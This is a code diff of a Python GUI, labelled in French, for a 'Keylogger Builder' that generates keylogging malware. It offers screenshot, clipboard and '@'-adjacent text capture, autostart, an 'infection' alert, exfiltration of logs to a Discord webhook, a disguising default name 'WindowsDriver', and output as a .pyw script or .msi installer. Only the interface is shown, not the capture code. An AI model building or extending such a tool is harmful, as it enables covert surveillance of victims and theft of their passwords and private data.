+header = ctk.CTkFrame(app, fg_color="transparent")
+header.pack(fill="x", pady=(15, 10), padx=20)
 
-instructions = ctk.CTkLabel(app, text="Entrez le nom du webhook Discord pour envoyer les logs capturés :", font=ctk.CTkFont(size=16))
-instructions.pack(pady=10)
-webhook_entry = ctk.CTkEntry(app, width=400, font=ctk.CTkFont(size=14), placeholder_text="https://discord.com/api/webhooks/...")
-webhook_entry.pack(pady=10)
+ctk.CTkLabel(
+    header,
+    text="⚡ KEYLOGGER BUILDER",
+    font=ctk.CTkFont(size=32, weight="bold"),
+    text_color="#60a5fa"
+).pack(side="left")
 
-webhook_btn = ctk.CTkButton(app, text="Valider", font=ctk.CTkFont(size=14), command=valider_webhook)
-webhook_btn.pack(pady=10)
+ctk.CTkLabel(
+    header,
+    text="Boutons 3D • Interface Moderne",
+    font=ctk.CTkFont(size=12),
+    text_color="#93c5fd"
+).pack(side="left", padx=20)
 
-test_btn = ctk.CTkButton(app, text="Tester le webhook", font=ctk.CTkFont(size=14), command=test_webhook)
-test_btn.pack(pady=10)
+ctk.CTkButton(
+    header,
+    text="✖ Quitter",
+    width=100,
+    fg_color="#ef4444",
+    hover_color="#dc2626",
+    command=app.quit
+).pack(side="right")
 
-# Variables reliées aux cases à cocher
-choix_nom_var = ctk.BooleanVar(value=False)
+# CONTAINER
+container = ctk.CTkFrame(app, fg_color="transparent")
+container.pack(expand=True, fill="both", padx=20, pady=10)
+
+# SIDEBAR
+sidebar = ctk.CTkScrollableFrame(container, width=350, corner_radius=15)
+sidebar.pack(side="left", fill="y", padx=(0, 15))
+
+ctk.CTkLabel(
+    sidebar,
+    text="⚙️ OPTIONS",
+    font=ctk.CTkFont(size=20, weight="bold"),
+    text_color="#60a5fa"
+).pack(pady=(10, 15))
+
+# Variables
 screenshot_var = ctk.BooleanVar(value=False)
 clipboard_var = ctk.BooleanVar(value=False)
 autostart_var = ctk.BooleanVar(value=False)
-activity_time_var = ctk.BooleanVar(value=False)
 capture_var = ctk.BooleanVar(value=False)
-low_slow_var = ctk.BooleanVar(value=False)
 alert_var = ctk.BooleanVar(value=False)
 
-def text():
-    if switch.get() == 1:
-        jsp.set(".pyw")
-    else:
-        jsp.set(".msi")
-
-jsp = ctk.StringVar(value=".msi")
-
-# Cases à cocher
-choix_nom = ctk.CTkCheckBox(app, text="Choix du nom du keylogs", variable=choix_nom_var, command=nom_keylogs)
-choix_nom.pack(pady=5)
-screenshot_option = ctk.CTkCheckBox(app, text="Capture d'écran chaque minute", variable=screenshot_var)
-screenshot_option.pack(pady=5)
-clipboard_option = ctk.CTkCheckBox(app, text="Capture du presse-papier", variable=clipboard_var)
-clipboard_option.pack(pady=5)
-autostart_option = ctk.CTkCheckBox(app, text="Démarrage automatique", variable=autostart_var)
-autostart_option.pack(pady=5)
-capture_before_after_at_option = ctk.CTkCheckBox(app, text="Capture avant @ et après", variable=capture_var)
-capture_before_after_at_option.pack(pady=5)
-alert_on_infection_option = ctk.CTkCheckBox(app, text="Alerte si contamination", variable=alert_var)
-alert_on_infection_option.pack(pady=5)
-switch = ctk.CTkSwitch(app, textvariable=jsp, command=text)
-switch.pack()
+# Checkboxes 3D
+Checkbox3D(sidebar, text="📸 Capture d'écran", variable=screenshot_var).pack(pady=8, padx=15, anchor="w")
+Checkbox3D(sidebar, text="📋 Presse-papier", variable=clipboard_var).pack(pady=8, padx=15, anchor="w")
+Checkbox3D(sidebar, text="🚀 Démarrage auto", variable=autostart_var).pack(pady=8, padx=15, anchor="w")
+Checkbox3D(sidebar, text="📧 Capture @", variable=capture_var).pack(pady=8, padx=15, anchor="w")
+Checkbox3D(sidebar, text="🔔 Alerte infection", variable=alert_var).pack(pady=8, padx=15, anchor="w")
 
 
+# ZONE PRINCIPALE
+main_area = ctk.CTkFrame(container, corner_radius=15)
+main_area.pack(side="left", expand=True, fill="both")
 
-# Bouton lancer
-lancer_btn = ctk.CTkButton(app, text="Lancer le programme", font=ctk.CTkFont(size=16, weight="bold"), command=lancer_programme)
-lancer_btn.pack(pady=20)
+# Webhook
+ctk.CTkLabel(
+    main_area,
+    text="🔗 Webhook Discord",
+    font=ctk.CTkFont(size=16, weight="bold")
+).pack(pady=(25, 5))
 
-"""
-with open("logs.txt", "a") as fichier:
-        fichier.write(
-            f"------------------------------------\n"
-            f"\n"
-            f" [{time.strftime('%d-%m-%Y %H:%M:%S')}]     Ouverture du Keylog \n"
-            f"\n"
-            f"------------------------------------\n"
-            f"\n"
-        )
-        """
+webhook_entry = ctk.CTkEntry(
+    main_area,
+    width=600,
+    height=45,
+    font=ctk.CTkFont(size=14),
+    placeholder_text="https://discord.com/api/webhooks/..."
+)
+webhook_entry.pack(pady=(0, 15))
 
-def key():
+# Nom
+ctk.CTkLabel(
+    main_area,
+    text="📝 Nom du fichier",
+    font=ctk.CTkFont(size=14, weight="bold")
+).pack(pady=(10, 5))
+
+name_var = ctk.StringVar(value="WindowsDriver")
+ctk.CTkEntry(
+    main_area,
+    textvariable=name_var,
+    width=400,
+    height=40,
+    font=ctk.CTkFont(size=13)
+).pack(pady=(0, 20))
+
+# Type
+build_frame = ctk.CTkFrame(main_area, fg_color="transparent")
+build_frame.pack(pady=15)
+
+ctk.CTkLabel(
+    build_frame,
+    text="📦 Type :",
+    font=ctk.CTkFont(size=14, weight="bold")
+).pack(side="left", padx=10)
+
+build_type = ctk.StringVar(value="pyw")
+
+ctk.CTkRadioButton(
+    build_frame,
+    text=".pyw (Script)",
+    variable=build_type,
+    value="pyw",
+    font=ctk.CTkFont(size=13)
+).pack(side="left", padx=10)
+
+ctk.CTkRadioButton(
+    build_frame,
+    text=".msi (Installeur)",
+    variable=build_type,
+    value="msi",
+    font=ctk.CTkFont(size=13)
+).pack(side="left", padx=10)
+
+# BOUTONS 3D
+buttons_frame = ctk.CTkFrame(main_area, fg_color="transparent")
+buttons_frame.pack(pady=30)
+
+Button3D(
+    buttons_frame,
+    text="🧪 TEST WEBHOOK",
+    command=test_webhook,
+    color="#f59e0b",
+    width=230,
+    height=60
+).grid(row=0, column=0, padx=10, pady=10)
+
+Button3D(
+    buttons_frame,
+    text="🔨 BUILD",
+    command=lancer_programme,
+    color="#8b5cf6",
+    width=230,
+    height=60
+).grid(row=0, column=1, padx=10, pady=10)
+
+# FOOTER
+ctk.CTkLabel(
+    app,
+    text="✅ Prêt à générer | Keylogger Builder 2024",
+    font=ctk.CTkFont(size=11),
+    text_color="#64748b"
+).pack(side="bottom", pady=10)
+
+# Log
+with open("logs.txt", "a", encoding="utf-8") as f:
+    f.write(f"[{time.strftime('%d-%m-%Y %H:%M:%S')}] Ouverture\n")
+
+if __name__ == "__main__":
+    print("=" * 60)
+    print("⚡ KEYLOGGER BUILDER 3D")
+    print("=" * 60)
     app.mainloop()
+
+# Installation: pip install customtkinter requests pynput pillow clipboard cx_Freeze
